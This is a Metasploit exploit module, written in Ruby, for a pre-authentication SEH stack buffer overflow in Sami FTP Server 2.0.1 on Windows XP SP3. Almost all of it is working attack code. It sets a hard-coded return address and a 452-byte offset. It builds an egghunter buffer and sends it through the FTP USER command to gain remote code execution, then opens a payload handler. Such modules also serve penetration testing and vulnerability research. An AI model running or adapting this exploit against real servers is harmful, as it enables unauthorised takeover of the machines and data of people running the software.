##
# Exploit Title: Sami FTP Pre-Authentication SEH Buffer Overflow
# Date: Mar 08 2013
# Exploit Author: Muhamad fadzil Ramli <fadzil@motivsolution.asia>
# Vendor Homepage: http://www.karjasoft.com
# Software Link: http://www.karjasoft.com/old.php
# Version: 2.0.1
# Tested on: Microsoft Windows XP Pro SP3
#
# This file is part of the Metasploit Framework and may be subject to
# redistribution and commercial restrictions. Please see the Metasploit
# Framework web site for more information on licensing and terms of use.
#   http://metasploit.com/framework/
##

require 'msf/core'

class Metasploit3 < Msf::Exploit::Remote
	Rank = NormalRanking

	include Msf::Exploit::Remote::Ftp
	include Msf::Exploit::Seh
	include Msf::Exploit::Egghunter

	def initialize(info = {})
		super(update_info(info,
			'Name'		=> 'Sami FTP Server Pre-Auth SEH Buffer Overflow',
			'Description'	=> %q{
                                      This module exploits a SEH stack-based buffer overflow in Sami FTP server 2.0.1.
                                      Sami FTP server fails to check input size when parsing USER commands, which
                                      leads to a stack based buffer overflow when are viewed under Log tab.
			},
			'License'		=> MSF_LICENSE,
			'Author'		=>
				[
					'superkojiman',	# Original discovery
					'Muhamad Fadzil Ramli <fadzil@motivsolution.asia>',	# MSF Module
				],
			'References'	=>
				[
					[ 'OSVDB', '<none>' ],
					[ 'CVE', '<none>' ],
					[ 'URL', '<none>' ]
				],
			'DefaultOptions' =>
				{
					'ExitFunction' => 'thread', #none/process/thread/seh
					#'InitialAutoRunScript' => 'migrate -f',
				},
			'Platform'	=> 'win',
			'Payload'	=>
				{
					'BadChars' => "\x00\x0a\x0d\x20\x2f", # <change if needed>
					'DisableNops' => true,
				},

			'Targets'		=>
				[
					[ 'Microsoft Windows XP Pro SP3',
						{
							'Ret'		=>	0x10025669, # pop edi # pop ebx # ret  - tmp0.dll
							'Offset'	=>	452
						}
					],
				],
			'Privileged'	=> false,
			'DisclosureDate'	=> 'Mar 08 2013',
			'DefaultTarget'	=> 0))

		register_options([Opt::RPORT(21)], self.class)

	end

	def exploit


		connect

		badchars    = "\x00\x0a\x0d\x20\x2f"
		eggoptions  = { :startreg => 'eax', :checksum => 'true', :eggtag => 'w00t' }
		hunter, egg = generate_egghunter( payload.encoded, badchars, eggoptions )

		buffer = rand_text(target['Offset']) #junk
		buffer << generate_seh_record(target.ret)
		buffer << make_nops(16)
		buffer << hunter
		buffer << egg	# our payload
		buffer << rand_text_alpha(100) # junk

		print_status("Egg size: #{egg.length}")
		print_status("Payload size: #{buffer.length}")
		print_status("Trying target #{target.name}...")

		send_cmd(['USER',buffer],false)

		print_status("Please wait...lalalala..")
		sleep(45) # waiting for magic to happen!!
		handler
		disconnect

	end
end
